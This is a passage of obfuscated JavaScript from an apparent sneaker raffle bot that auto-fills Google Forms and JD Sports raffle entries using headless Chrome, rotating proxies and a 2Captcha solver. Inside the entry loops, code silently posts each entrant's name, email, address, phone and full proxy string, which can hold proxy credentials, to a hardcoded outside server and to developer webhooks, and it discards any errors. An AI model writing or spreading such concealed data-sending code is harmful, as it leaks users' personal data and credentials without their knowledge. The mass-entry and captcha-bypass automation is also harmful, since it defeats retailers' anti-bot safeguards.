                        _0x13e83d(_0x378bdc[_0x40d642], _0x128f76), console['log'](_0x3dfcf2['green'](_0x82e5a5() + '\x20[' + _0x128f76['name'] + ']\x20Task\x20' + (_0x40d642 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x4c6c19 = _0x378bdc[_0x40d642];
                        try {
                            prxdata = {
                                'username': _0x128b96['replace']('#', ''),
                                'module': _0x128f76['name'],
                                'entrydata': JSON['stringify'](_0x4c6c19),
                                'proxy': '' + _0x208168[_0x40d642]
                            };
                            var _0x591cb0 = JSON['stringify'](prxdata);
                            let _0x462a2a = { 'headers': { 'content-type': 'application/json' } };
                            await _0x48af5a['post']('https://jraffles.herokuapp.com/success', _0x591cb0, _0x462a2a);
                        } catch (_0x33dd77) {
                        }
                        if (_0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '')
                            try {
                                await _0x48936e(_0x4ae33b['webhook'], _0x2e5688['succesDEVMSG']);
                            } catch {
                            }
                        await _0x41ed31(0xc8), await _0x48936e(_0x3a625c, _0x2e5688['succesDEVMSG']), await _0x41ed31(0xc8);
                        try {
                            await _0x48936e(_0x22a07c, _0x2e5688['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x31d9c1) {
                        console['log'](_0x82e5a5() + '\x20[' + _0x128f76['name'] + ']\x20Task\x20' + (_0x40d642 + 0x1) + '\x20:\x20' + _0x31d9c1), _0x1fc35b = '' + _0x31d9c1;
                        var _0x4e96c9 = await _0x559dec(_0x378bdc[_0x40d642], _0x128f76, 'dev', !![], _0x1fc35b);
                        _0x2e5688['errorDEV'] = { 'embeds': [_0x4e96c9] }, _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x2e5688['errorDEV']), await _0x48936e(_0x36657d, _0x2e5688['errorDEV']), _0x572561 = 'yes';
                    } finally {
                        _0x4ebb31['close']();
                        if (_0x572561 == 'yes' && _0x128fbb != 0x5) {
                            console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x128f76['name'] + ']\x20Task\x20' + (_0x40d642 + 0x1) + '\x20:\x20Retrying\x20(' + _0x128fbb + '\x20/\x205)')), _0x40d642 = _0x40d642 - 0x1, _0x128fbb = _0x128fbb + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x4ae33b['delay'] + '\x20ms'), await _0x41ed31(_0x4ae33b['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'Google\x20Forms',
        'modules': [{
            'name': 'SMART\x20ENTRIES',
            'store': 'Google\x20Forms',
            'logo': 'https://www.pngplay.com/wp-content/uploads/13/Google-Logo-PNG-HD-Quality.png',
            'function': async function (_0x346917, _0x2a9244, _0xca17f3) {
                let _0x309862 = {
                    'FirstName': '',
                    'LastName': '',
                    'Email': '',
                    'Country': '',
                    'Address': '',
                    'City': '',
                    'Zip': '',
                    'Size': '',
                    'Phone': ''
                };
                var _0x384ddf = _0x223df9['readFileSync']('forms/templates.json', 'utf-8');
                let _0x41ef91 = JSON['parse'](_0x384ddf), _0x69fd5a = ![];
                if (_0x41ef91['length'] != 0x0) {
                    let _0x407bcb = 0x0;
                    for (template of _0x41ef91) {
                        if (template['Url'] == _0x2a9244[0x0]['Url']) {
                            _0x69fd5a = !![], console['log'](_0x3dfcf2['yellow']('Would\x20you\x20like\x20to\x20use\x20this\x20template?'));
                            for (key in template) {
                                key != 'Url' && !key['includes']('Select') && !key['includes']('custom') && template[key] != '' && console['log'](template[key] + ':\x20' + _0x3dfcf2['cyan'](key)), (key['includes']('Select') || key['includes']('custom')) && console['log'](template[key]['title'] + ':\x20' + _0x3dfcf2['cyan'](template[key]['answer']));
                            }
                            console['log']();
                            async function _0x5bee08() {
                                let _0x1aaf97 = await _0x5addda['get']('answer');
                                if (_0x1aaf97['answer']['toLowerCase']() != 'y' && _0x1aaf97['answer']['toLowerCase']() != 'n')
                                    return console['log']('Invalid\x20Selection'), _0x5bee08();
                                return _0x1aaf97['answer']['toLowerCase']();
                            }
                            if (await _0x5bee08() == 'n') {
                                _0x41ef91['splice'](_0x407bcb, 0x1), console['clear']();
                                break;
                            }
                            _0x309862 = template, console['clear']();
                            break;
                        }
                        _0x407bcb++;
                    }
                }
                let _0xfb757f = 0x0, _0x4502fe = 0x0;
                function _0x43daf1(_0x4d1ea6) {
                    console['log'](_0x82e5a5() + '\x20[' + _0x346917['name'] + ']\x20Task\x20' + (_0x3f998f + 0x1) + '\x20:\x20' + _0x4d1ea6);
                }
                var _0x396b66 = 0x0;
                for (key in _0x309862) {
                    if (key['includes']('custom'))
                        _0xfb757f++;
                    if (key['includes']('Select'))
                        _0x4502fe++;
                }
                for (var _0x3f998f = 0x0; _0x3f998f < _0x2a9244['length']; _0x3f998f++) {
                    _0x309862['Url'] = _0x2a9244[_0x3f998f]['Url'];
                    let _0x21c113 = ![];
                    if (_0x41ef91['length'] != 0x0)
                        for (template of _0x41ef91) {
                            if (template['Url'] == _0x2a9244[_0x3f998f]['Url']) {
                                _0x309862 = template, _0x21c113 = !![], _0x43daf1('Found\x20Template');
                                break;
                            }
                        }
                    var _0x21be74;
                    if (_0x552246 != 'yes') {
                        if (!_0x552246)
                            var _0x552246 = '';
                        else
                            _0x552246 = '';
                        _0x396b66 = 0x0;
                    }
                    try {
                        await _0x101e1b(_0x2a9244, _0x3f998f);
                    } catch {
                        _0x552246 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x4ae33b['useRandomProxy'] = ![])
                        var _0x4e88cf = _0xca17f3[_0x3f998f]['split'](':');
                    else
                        var _0x251ea5 = Math['round'](Math['random']() * (_0xca17f3['length'] - 0x1)), _0x4e88cf = _0xca17f3[_0x251ea5]['split'](':');
                    var _0xf0220;
                    if (_0x4e88cf['length'] == 0x1)
                        try {
                            _0xf0220 = await _0x23e690['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xf0220 = await _0x23e690['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    else
                        try {
                            _0xf0220 = await _0x23e690['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4e88cf[0x0] + ':' + _0x4e88cf[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xf0220 = await _0x23e690['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4e88cf[0x0] + ':' + _0x4e88cf[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    try {
                        let _0xaf31a4 = { 'first': ![] };
                        const _0x2122a7 = await _0xf0220['newPage']();
                        if (_0x4e88cf['length'] != 0x0)
                            await _0x2122a7['authenticate']({
                                'username': '' + _0x4e88cf[0x2],
                                'password': '' + _0x4e88cf[0x3]
                            });
                        _0x43daf1('Getting\x20Session');
                        let _0x58db4d = ![];
                        try {
                            await _0x2122a7['goto'](_0x2a9244[_0x3f998f]['Url'], {
                                'waitUntil': 'load',
                                'timeout': 0x0
                            }), await _0x41ed31(0xbb8);
                        } catch (_0x2e2213) {
                            throw new Error(_0x2e2213);
                        }
                        const _0x5161fa = await _0x2122a7['$']('body\x20>\x20div.llhEMd.iWO5td\x20>\x20div\x20>\x20div.g3VIld.Up8vH.J9Nfi.iWO5td\x20>\x20div.XfpsVe.J9fJmf');
                        if (_0x5161fa) {
                            _0x43daf1('Login\x20Detected');
                            let _0x17e2c6 = await _0x5161fa['$']('div[data-id=\x22EBS5u\x22]');
                            await _0x17e2c6['click'](), _0x58db4d = !![];
                        }
                        let _0x592a2b = await _0x2122a7['$']('#identifierId');
                        _0x592a2b && (_0x58db4d = !![]);
                        await _0x2122a7['waitForSelector']('.teQAzf');
                        async function _0x3066fe() {
                            let _0xa17472 = await _0x2122a7['$$']('.o3Dpx\x20>\x20div[role=\x22listitem\x22]');
                            for (question of _0xa17472) {
                                let _0x49324e;
                                try {
                                    _0x49324e = await question['$eval']('.M7eMe', _0x359d1a => _0x359d1a['textContent']);
                                } catch {
                                    continue;
                                }
                                if (_0xfb757f != 0x0) {
                                    let _0xa542da = ![];
                                    for (let _0x40823a = 0x0; _0x40823a < _0xfb757f; _0x40823a++) {
                                        if (_0x49324e == _0x309862['custom' + _0x40823a]['title']) {
                                            _0x43daf1('Custom\x20Selector\x20found;\x20' + _0x49324e);
                                            let _0xb4c215 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x2b3621 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                            if (_0xb4c215)
                                                await _0xb4c215['type']('' + _0x309862['custom' + _0x40823a]['answer']);
                                            else
                                                _0x2b3621 && await _0x2b3621['type']('' + _0x309862['custom' + _0x40823a]['answer']);
                                            _0xa542da = !![];
                                            break;
                                        }
                                    }
                                    if (_0xa542da) {
                                        await _0x41ed31(0x15e);
                                        continue;
                                    }
                                }
                                if (_0x4502fe != 0x0) {
                                    let _0x596a47 = ![];
                                    for (let _0x1ff2c7 = 0x0; _0x1ff2c7 < _0x4502fe; _0x1ff2c7++) {
                                        if (_0x49324e == _0x309862[_0x1ff2c7 + 'Select']['title']) {
                                            _0x43daf1('Custom\x20Selector\x20found;\x20' + _0x49324e);
                                            let _0x26db83 = await question['$$']('.ulDsOb');
                                            for (opt of _0x309862[_0x1ff2c7 + 'Select']['answer']) {
                                                let _0x4f5f75 = await _0x26db83[opt]['$']('span');
                                                await _0x4f5f75['click']();
                                            }
                                            _0x596a47 = !![];
                                            break;
                                        }
                                    }
                                    if (_0x596a47) {
                                        await _0x41ed31(0x15e);
                                        continue;
                                    }
                                }
                                try {
                                    if (_0x49324e == _0x309862['0Select']['title']) {
                                        _0x43daf1('Custom\x20Selector\x20found;\x20' + _0x309862['0Select']['title']);
                                        let _0xa199b6 = await question['$$']('.ulDsOb'), _0x200427 = await _0xa199b6[_0x309862['0Select']['answer']];
                                        await _0x200427['click']();
                                        continue;
                                    }
                                    if (_0x49324e == _0x309862['1Select']['title']) {
                                        _0x43daf1('Custom\x20Selector\x20found;\x20' + _0x309862['1Select']['title']);
                                        let _0x1ae304 = await question['$$']('.ulDsOb'), _0x290fb7 = await _0x1ae304[_0x309862['1Select']['answer']];
                                        await _0x290fb7['click']();
                                        continue;
                                    }
                                    if (_0x49324e == _0x309862['2Select']['title']) {
                                        _0x43daf1('Custom\x20Selector\x20found;\x20' + _0x309862['2Select']['title']);
                                        let _0x26a53d = await question['$$']('.ulDsOb'), _0x42e434 = await _0x26a53d[_0x309862['2Select']['answer']];
                                        await _0x42e434['click']();
                                        continue;
                                    }
                                } catch (_0x41c87c) {
                                }
                                if (_0x49324e['toLowerCase']()['includes']('mail') && !_0x49324e['toLowerCase']()['includes']('agree') || _0x49324e == _0x309862['Email']) {
                                    _0x43daf1('Mail\x20Selector\x20found;\x20' + _0x49324e);
                                    let _0x3e7b9f = await question['$']('input');
                                    !_0x3e7b9f && (_0x3e7b9f = await question['$']('textarea[jsname=\x22YPqjbf\x22]'));
                                    await _0x3e7b9f['type'](_0x2a9244[_0x3f998f]['Email']), await _0x41ed31(0x258);
                                    continue;
                                }
                                if (_0x49324e['toLowerCase']()['includes']('first') || _0x49324e['toLowerCase']() == 'name' || _0x49324e['toLowerCase']() == 'name\x20' || _0x49324e == _0x309862['FirstName']) {
                                    _0x43daf1('FirstName\x20Selector\x20found;\x20' + _0x49324e);
                                    let _0x5cef45 = await question['$']('input');
                                    !_0x5cef45 && (_0x5cef45 = await question['$']('textarea'));
                                    await _0x5cef45['type'](_0x2a9244[_0x3f998f]['FirstName'] + '\x20'), await _0x41ed31(0x258);
                                    if (_0x49324e == _0x309862['FirstName'])
                                        continue;
                                }
                                if (_0x49324e['toLowerCase']()['includes']('last') || _0x49324e['toLowerCase']()['includes']('surname') || _0x49324e == _0x309862['LastName']) {
                                    _0x43daf1('LastName\x20Selector\x20found;\x20' + _0x49324e);
                                    let _0x36bb85 = await question['$']('input');
                                    !_0x36bb85 && (_0x36bb85 = await question['$']('textarea'));
                                    await _0x36bb85['type'](_0x2a9244[_0x3f998f]['LastName'] + '\x20'), await _0x41ed31(0x258);
                                    continue;
                                }
                                if (_0x49324e['toLowerCase']()['includes']('address') && !_0x49324e['toLowerCase']()['includes']('agree') || _0x49324e == _0x309862['Address']) {
                                    _0x43daf1('Address\x20Selector\x20found;\x20' + _0x49324e);
                                    let _0x18df14 = await question['$']('input');
                                    !_0x18df14 && (_0x18df14 = await question['$']('textarea'));
                                    await _0x18df14['type'](_0x2a9244[_0x3f998f]['Address1'] + '\x20' + _0x2a9244[_0x3f998f]['HouseNumber'] + '\x20' + _0x2a9244[_0x3f998f]['Address2']), await _0x41ed31(0x258);
                                    continue;
                                }
                                if (_0x49324e['toLowerCase']()['includes']('phone') || _0x49324e['toLowerCase']()['includes']('mobile') || _0x49324e == _0x309862['Phone']) {
                                    _0x43daf1('Phone\x20Selector\x20found;\x20' + _0x49324e);
                                    let _0x3bbdc9 = await question['$']('input');
                                    !_0x3bbdc9 && (_0x3bbdc9 = await question['$']('textarea'));
                                    await _0x3bbdc9['type']('' + _0x2a9244[_0x3f998f]['Phone']), await _0x41ed31(0x258);
                                    continue;
                                }
                                if (_0x49324e['toLowerCase']()['includes']('country') || _0x49324e == _0x309862['Country']) {
                                    let _0x47d551 = await question['$']('div[jsname=\x22wCJL8\x22]');
                                    if (_0x47d551) {
                                        let _0xeb6c00 = ![], _0x2bc36 = await _0x47d551['$$']('.ulDsOb');
                                        for (option of _0x2bc36) {
                                            let _0x194965 = await option['$']('span'), _0x47bbe4 = await option['$eval']('span', _0x4a33da => _0x4a33da['textContent']);
                                            if (_0x47bbe4['toLowerCase']() == _0x2a9244[_0x3f998f]['Country']['toLowerCase']()) {
                                                await _0x194965['click'](), _0xeb6c00 = !![];
                                                break;
                                            }
                                        }
                                        if (!_0xeb6c00) {
                                            const _0x25b446 = await question['$']('.Hvn9fb.zHQkBf');
                                            await _0x25b446['click'](), await _0x25b446['type'](_0x2a9244[_0x3f998f]['Country']);
                                        }
                                        continue;
                                    }
                                    _0x43daf1('Country\x20Selector\x20found;\x20' + _0x49324e);
                                    let _0x556ca7 = await question['$']('input');
                                    !_0x556ca7 && (_0x556ca7 = await question['$']('textarea'));
                                    await _0x556ca7['type']('' + _0x2a9244[_0x3f998f]['Country']), await _0x41ed31(0x258);
                                    continue;
                                }
                                if (_0x49324e['toLowerCase']()['includes']('city') || _0x49324e == _0x309862['City']) {
                                    _0x43daf1('City\x20Selector\x20found;\x20' + _0x49324e);
                                    let _0x51bbc7 = await question['$']('input');
                                    !_0x51bbc7 && (_0x51bbc7 = await question['$']('textarea'));
                                    await _0x51bbc7['type']('' + _0x2a9244[_0x3f998f]['City']), await _0x41ed31(0x258);
                                    continue;
                                }
                                if (_0x49324e['toLowerCase']()['includes']('zip') || _0x49324e == _0x309862['Zip']) {
                                    _0x43daf1('Zip\x20Selector\x20found;\x20' + _0x49324e);
                                    let _0x904566 = await question['$']('input');
                                    !_0x904566 && (_0x904566 = await question['$']('textarea'));
                                    await _0x904566['type']('' + _0x2a9244[_0x3f998f]['Zip']), await _0x41ed31(0x258);
                                    continue;
                                }
                                if (_0x49324e['toLowerCase']()['includes']('insta') || _0x49324e == _0x309862['Follower']) {
                                    _0x43daf1('Follower\x20Selector\x20found;\x20' + _0x49324e);
                                    let _0x5bbe7c = await question['$']('input');
                                    !_0x5bbe7c && (_0x5bbe7c = await question['$']('textarea'));
                                    await _0x5bbe7c['type']('' + _0x2a9244[_0x3f998f]['Follower']), await _0x41ed31(0x258);
                                    continue;
                                }
                                if (_0x49324e['toLowerCase']()['includes']('size') || _0x49324e == _0x309862['Size']) {
                                    _0x43daf1('Size\x20Selector\x20found;\x20' + _0x49324e);
                                    let _0x5752fa = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x5752fa) {
                                        let _0x26b7b3 = await _0x5752fa['$$']('.ulDsOb');
                                        if (_0x2a9244[_0x3f998f]['Size']['toLowerCase']() == 'random') {
                                            var _0x46318a = Math['round'](Math['random']() * (_0x26b7b3['length'] - 0x1));
                                            await _0x26b7b3[_0x46318a]['click']();
                                        } else
                                            for (size of _0x26b7b3) {
                                                let _0x5afdbe = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x57131c => _0x57131c['textContent']);
                                                if (_0x5afdbe['toLowerCase']()['includes'](_0x2a9244[_0x3f998f]['Size'])) {
                                                    await size['click']();
                                                    break;
                                                }
                                            }
                                    }
                                    let _0x935b9d = await question['$']('.ry3kXd');
                                    if (_0x935b9d) {
                                        await _0x935b9d['click'](), await _0x41ed31(0x9c4);
                                        let _0xf6fc3c = await _0x2122a7['$']('div[jsname=\x22V68bde\x22]'), _0x32d8ea = await _0xf6fc3c['$$']('div[jsname=\x22wQNmvb\x22]');
                                        for (size of _0x32d8ea) {
                                            let _0x5bd78b = await size['$eval']('.vRMGwf.oJeWuf', _0x15f483 => _0x15f483['textContent']), _0x37f80b = await size['$']('.vRMGwf.oJeWuf');
                                            if (_0x5bd78b['toLowerCase']()['includes'](_0x2a9244[_0x3f998f]['Size'])) {
                                                await _0x41ed31(0x190), await _0x37f80b['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x41ed31(0x258);
                                    continue;
                                }
                                if (_0x49324e['toLowerCase']()['includes']('receive') || _0x49324e['toLowerCase']()['includes']('method')) {
                                    _0x43daf1('Method\x20Selector\x20found;\x20' + _0x49324e);
                                    let _0x4d5002 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x4d5002) {
                                        const _0x18d74f = await _0x4d5002['$$']('.ulDsOb');
                                        for (size of _0x18d74f) {
                                            let _0x4fbdef = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x230cda => _0x230cda['textContent']);
                                            if (_0x4fbdef['toLowerCase']()['includes']('shipping')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x41ed31(0x258);
                                    continue;
                                }
                                if (_0x49324e['toLowerCase']()['includes']('offers') || _0x49324e['toLowerCase']()['includes']('agree')) {
                                    _0x43daf1('Authorization\x20Selector\x20found;\x20' + _0x49324e);
                                    const _0x5ceda8 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x5ceda8) {
                                        const _0x4b25d6 = await _0x5ceda8['$$']('.ulDsOb');
                                        for (size of _0x4b25d6) {
                                            let _0x1c3261 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x2837e1 => _0x2837e1['textContent']);
                                            if (_0x1c3261['toLowerCase']()['includes']('authorize') || _0x1c3261['toLowerCase']()['includes']('yes')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x41ed31(0x258);
                                    continue;
                                }
                                async function _0x594a17() {
                                    let _0x395800 = await question['$']('.oyXaNc');
                                    if (_0x395800) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x3dfcf2['cyan'](_0x49324e) + '\x0a');
                                        let _0xde74e3 = await question['$$']('.ulDsOb');
                                        for (let _0x34cdf7 = 0x0; _0x34cdf7 < _0xde74e3['length']; _0x34cdf7++) {
                                            let _0x3cd741 = await _0xde74e3[_0x34cdf7]['$eval']('span', _0xcc9693 => _0xcc9693['textContent']);
                                            console['log']('\x20(' + _0x34cdf7 + ')\x20' + _0x3cd741);
                                        }
                                        console['log']();
                                        let _0x2ae76c = await _0x5addda['get']('option'), _0x13108b = await _0xde74e3[_0x2ae76c['option']]['$eval']('span', _0x5820e1 => _0x5820e1['textContent']);
                                        _0x309862[_0x4502fe + 'Select'] = {
                                            'title': _0x49324e,
                                            'answer': _0x2ae76c['option']['split'](',')
                                        };
                                        let _0x445e76 = await _0xde74e3[_0x2ae76c['option']]['$']('span');
                                        await _0x445e76['click'](), _0x4502fe++;
                                        return;
                                    }
                                    let _0x2c64cf = await question['$']('.Y6Myld');
                                    if (_0x2c64cf) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x3dfcf2['cyan'](_0x49324e) + '\x0a');
                                        let _0x24be75 = await question['$$']('.ulDsOb');
                                        for (let _0x5e1ee2 = 0x0; _0x5e1ee2 < _0x24be75['length']; _0x5e1ee2++) {
                                            let _0x57d9a6 = await _0x24be75[_0x5e1ee2]['$eval']('span', _0x4cce95 => _0x4cce95['textContent']);
                                            console['log']('\x20(' + _0x5e1ee2 + ')\x20' + _0x57d9a6);
                                        }
                                        console['log']();
                                        let _0x540000 = await _0x5addda['get']('option');
                                        _0x309862[_0x4502fe + 'Select'] = {
                                            'title': _0x49324e,
                                            'answer': _0x540000['option']['split'](',')
                                        };
                                        for (opt of _0x309862[_0x4502fe + 'Select']['answer']) {
                                            let _0x2e78ab = await _0x24be75[opt]['$']('span');
                                            await _0x2e78ab['click']();
                                        }
                                        _0x4502fe++;
                                        return;
                                    }
                                    var _0x29f172 = 0x0;
                                    let _0xae0853 = Object['keys'](_0x309862);
                                    console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x3dfcf2['cyan'](_0x49324e) + '\x0a');
                                    for (data of _0xae0853) {
                                        !data['includes']('custom' && !data['includes']('Select')) ? console['log']('\x20(' + _0x29f172 + ')\x20' + data + '\x20(Taken\x20from\x20csv)') : console['log']('\x20(' + _0x29f172 + ')\x20' + data), _0x29f172++;
                                    }
                                    console['log']('\x20(' + _0xae0853['length'] + ')\x20Custom\x20input:'), console['log']();
                                    let _0x30c15a = await _0x5addda['get']('input');
                                    if (_0x30c15a['input'] == _0xae0853['length']) {
                                        console['log']('What\x20should\x20the\x20bot\x20fill\x20in\x20this\x20input?\x0a');
                                        let _0x401e0b = await _0x5addda['get']('input');
                                        _0x309862['custom' + _0xfb757f] = {
                                            'title': _0x49324e,
                                            'answer': '' + _0x401e0b['input']
                                        };
                                        let _0x49aa3b = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x14b37d = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                        if (_0x49aa3b)
                                            await _0x49aa3b['type']('' + _0x309862['custom' + _0xfb757f]['answer']);
                                        else
                                            _0x14b37d && await _0x14b37d['type']('' + _0x309862['custom' + _0xfb757f]['answer']);
                                        _0xfb757f++;
                                        return;
                                    }
                                    _0x309862['' + _0xae0853[_0x30c15a['input']]] = _0x49324e;
                                    let _0x49002a = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x25e58f = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                    _0x49002a && await _0x49002a['type']('' + _0x2a9244[_0x3f998f]['' + _0xae0853[_0x30c15a['input']]]), _0x25e58f && await _0x25e58f['type']('' + _0x2a9244[_0x3f998f]['' + _0xae0853[_0x30c15a['input']]]), await _0x41ed31(0x258);
                                }
                                await _0x594a17(), await _0x41ed31(0x37a);
                            }
                            let _0xc017a9 = await _0x2122a7['$']('div[jsname=\x22OCpkoe\x22]');
                            if (_0xc017a9)
                                return await _0xc017a9['click'](), await _0x2122a7['waitForNavigation']({ 'waitUntil': 'networkidle2' }), _0x43daf1('New\x20Section'), _0x3066fe();
                        }
                        await _0x3066fe(), await _0x2122a7['click']('div[jsname=\x22M2UYVd\x22]');
                        try {
                            await _0x2122a7['waitForSelector']('.vHW8K');
                        } catch {
                            throw new Error('Could\x20not\x20send\x20Form,\x20check\x20all\x20fields!');
                        }
                        _0x13e83d(_0x2a9244[_0x3f998f], _0x346917), _0x552246 = 'no';
                        var _0x3ec3bc = await _0x559dec(_0x2a9244[_0x3f998f], _0x346917, 'dev', ![]), _0x2faf87 = await _0x559dec(_0x2a9244[_0x3f998f], _0x346917, 'pub', ![]);
                        let _0x7aa9e1 = _0x2a9244[_0x3f998f];
                        try {
                            prxdata = {
                                'username': _0x128b96['replace']('#', ''),
                                'module': _0x346917['name'],
                                'entrydata': JSON['stringify'](_0x7aa9e1),
                                'proxy': '' + _0xca17f3[_0x3f998f]
                            };
                            var _0x5c339d = JSON['stringify'](prxdata);
                            let _0x1409e0 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x48af5a['post']('https://jraffles.herokuapp.com/success', _0x5c339d, _0x1409e0);
                        } catch (_0x33a772) {
                        }
                        const _0x41384a = {
                            'succesDEVMSG': { 'embeds': [_0x3ec3bc] },
                            'succesPUBMSG': { 'embeds': [_0x2faf87] }
                        };
                        try {
                            _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x41384a['succesDEVMSG']), await _0x41ed31(0xc8), await _0x48936e(_0x3a625c, _0x41384a['succesDEVMSG']), await _0x41ed31(0xc8), await _0x48936e(_0x22a07c, _0x41384a['succesPUBMSG']);
                        } catch (_0x51e098) {
                            console['log'](_0x3dfcf2['yellow'](_0x82e5a5() + '\x20[' + _0x372ea7[taskModule]['name'] + ']\x20Task\x20' + (_0x3f998f + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x51e098));
                        }
                        console['log'](_0x3dfcf2['green'](_0x82e5a5() + '\x20[' + _0x346917['name'] + ']\x20Task\x20' + (_0x3f998f + 0x1) + '\x20:\x20Raffle\x20Entered!')), (_0xfb757f != 0x0 || _0x4502fe != 0x0 && !_0x21c113) && (_0x41ef91['push'](_0x309862), _0x223df9['writeFileSync']('forms/templates.json', JSON['stringify'](_0x41ef91, null, 0x2), 'utf-8'));
                    } catch (_0x40a68e) {
                        console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x346917['name'] + ']\x20Task\x20' + (_0x3f998f + 0x1) + '\x20:\x20' + _0x40a68e)), _0x21be74 = '' + _0x40a68e;
                        var _0xaf0b63 = await _0x559dec(_0x2a9244[_0x3f998f], _0x346917, 'dev', !![], _0x21be74);
                        let _0x17a8b5 = {};
                        _0x17a8b5['errorDEV'] = { 'embeds': [_0xaf0b63] }, _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x17a8b5['errorDEV']), await _0x48936e(_0x36657d, _0x17a8b5['errorDEV']), _0x552246 = 'yes';
                    } finally {
                        _0xf0220 && _0xf0220['close']();
                        if (_0x552246 == 'yes' && _0x396b66 != 0x5) {
                            console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x346917['name'] + ']\x20Task\x20' + (_0x3f998f + 0x1) + '\x20:\x20Retrying\x20(' + (_0x396b66 + 0x1) + '\x20/\x205)')), _0x3f998f--, _0x396b66++;
                            continue;
                        }
                        if (_0x552246 == 'yes' && _0x396b66 == 0x5) {
                            _0x396b66 = 0x0, _0x552246 = 'no';
                            continue;
                        }
                        _0x43daf1('Waiting\x20for\x20' + _0x4ae33b['delay'] + '\x20ms'), await _0x41ed31(_0x4ae33b['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x1605af, _0xa22213, _0x17ad82) {
                var _0x1330d2 = ![], _0x3aa834 = ![];
                if (_0x4ae33b['captchaKey'] == '' || _0x4ae33b['captchaKey'] == undefined)
                    return console['log'](_0x3dfcf2['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x23e690['use'](_0x57a02e()), _0x23e690['use'](_0x2aeb7e({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x4ae33b['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x3dd5c7 = 0x0; _0x3dd5c7 < _0xa22213['length']; _0x3dd5c7++) {
                    if (_0x2a2d03 != 'yes')
                        var _0x2a2d03 = '', _0xa55fea = 0x0;
                    var _0x6e5baa, _0x4d43fb = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0xa22213[_0x3dd5c7]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0xa22213[_0x3dd5c7]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x128b96
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x4ae33b['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x8a26c5
                            }
                        ]
                    }];
                    const _0x516f40 = { 'embeds': _0x4d43fb };
                    _0x445891(_0x1605af['name'] + '\x20Task\x20' + (_0x3dd5c7 + 0x1) + '\x20/\x20' + _0xa22213['length'] + '\x20||\x20File:\x20' + _0x4d7b48 + '\x20Proxies:\x20' + _0x2bc9a5);
                    try {
                        await _0x101e1b(_0xa22213, _0x3dd5c7);
                    } catch {
                        _0x2a2d03 = 'no';
